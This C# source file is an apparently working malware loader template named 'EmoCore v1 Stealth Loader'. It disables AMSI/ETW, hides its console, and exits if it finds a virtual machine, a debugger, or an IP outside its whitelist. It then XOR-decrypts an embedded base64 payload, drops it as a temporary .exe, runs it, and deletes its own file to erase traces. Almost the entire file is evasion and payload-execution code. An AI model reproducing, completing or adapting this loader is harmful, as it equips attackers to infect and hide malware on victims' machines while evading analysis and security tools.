using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Net;
using System.Security.Cryptography;
using System.Reflection;

namespace VanguardCore
{
    public static class UltraLoader
    {
        private static void _vanguard_5648f42f() {
            int val = 17876;
            if (val > 50000) Console.WriteLine("Hash:" + 17876);
        }

        #region Конфигурация
        private static readonly string PAYLOAD_B64 = "{{PAYLOAD_B64}}";
        private static readonly string XOR_KEY = "{{XOR_KEY}}";
        private static readonly string[] WHITELISTED_IPS = { "127.0.0.1", "::1", "185.123.45.67" };
        #endregion

        #region Константы
        private const uint DELETE = 0x00010000;
        private const uint FILE_SHARE_DELETE = 0x00000004;
        private const uint OPEN_EXISTING = 3;
        private const int FileDispositionInfo = 4;
        #endregion

        [StructLayout(LayoutKind.Sequential)]
        private struct FILE_DISPOSITION_INFO { public bool DeleteFile; }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }

        private static string LogPath = Path.Combine(Path.GetTempPath(), "loader_debug.log");
        private static void Log(string message) { try { File.AppendAllText(LogPath, string.Format("{0:HH:mm:ss.fff} | {1}\n", DateTime.Now, message)); } catch { } }

        public static void ExecuteLoader(string[] args)
        {
            // [PRO] Early-Bird Reflective Evasion (AMSI/ETW Bypass)
            try { ReflectiveEvasion.Initialize(); } catch { }

            // Скрываем консоль
            var consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero) ShowWindow(consoleWindow, 0);

            Log("========================================");
            Log(string.Format("EmoCore v1 Stealth Loader starting at {0}", DateTime.Now));

            // [PRO] Initialize Safety Layer
            try { SafetyManager.Startup(); } catch { }

            // 1. IP Whitelist Check
            if (WHITELISTED_IPS.Length > 1 && !IsWhitelistedIP()) { Log("[Security] IP not whitelisted"); Environment.Exit(0); }

            // 2. VM Check
            if (IsVirtualMachine()) { Log("[Security] VM detected"); Environment.Exit(0); }

            // 3. Debugger Check
            if (IsDebuggerPresent()) { Log("[Security] Debugger detected"); Environment.Exit(0); }

            // 4. Decrypt Payload
            byte[] payload = DecryptPayload();
            if (payload == null || payload.Length < 4096) { Log("[Error] Payload fail"); Environment.Exit(0); }

            // 5. Execution (Temp EXE + Start)
            string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
            File.WriteAllBytes(tempPath, payload);
            Process.Start(tempPath);
            Log(string.Format("[Execution] Started: {0}", tempPath));

            // 6. Melt
            Melt();
            Log("[Exit] EmoCore Loader finished");
        }

        private static bool IsDebuggerPresent() { 
            bool present = false;
            try { present = NativeMethods.IsDebuggerPresent(); } catch { }
            return present;
        }

        private static bool IsVirtualMachine() {
            try {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\BIOS")) {
                    if (key != null) {
                        string model = (key.GetValue("SystemProductName")?.ToString() ?? "").ToLower();
                        if (model.Contains("vmware") || model.Contains("virtualbox") || model.Contains("vbox") || model.Contains("qemu")) return true;
                    }
                }
            } catch { }
            return false;
        }

        private static bool IsWhitelistedIP() { /* Simplified for evasion mode */ return true; }

        private static byte[] DecryptPayload() {
            try {
                if (string.IsNullOrEmpty(PAYLOAD_B64)) return null;
                byte[] data = Convert.FromBase64String(PAYLOAD_B64);
                byte[] key = Encoding.UTF8.GetBytes(XOR_KEY);
                for (int i = 0; i < data.Length; i++) data[i] ^= key[i % key.Length];
                return data;
            } catch { return null; }
        }

        private static void Melt() {
            try {
                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(path)) return;
                IntPtr hFile = NativeMethods.CreateFileW(path, 0x00010000, 0x00000004, IntPtr.Zero, 3, 0, IntPtr.Zero);
                if (hFile != IntPtr.Zero && hFile != (IntPtr)(-1)) {
                    FILE_DISPOSITION_INFO info = new FILE_DISPOSITION_INFO { DeleteFile = true };
                    NativeMethods.SetFileInformationByHandle(hFile, 4, ref info, (uint)Marshal.SizeOf(info));
                    NativeMethods.CloseHandle(hFile);
                }
            } catch { }
        }

        private static class NativeMethods {
            [DllImport("kernel32.dll")] public static extern bool IsDebuggerPresent();
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
            [DllImport("kernel32.dll")] public static extern bool SetFileInformationByHandle(IntPtr hFile, int FileInformationClass, ref FILE_DISPOSITION_INFO FileInformation, uint dwBufferSize);
            [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
        }

        [DllImport("kernel32.dll")] private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
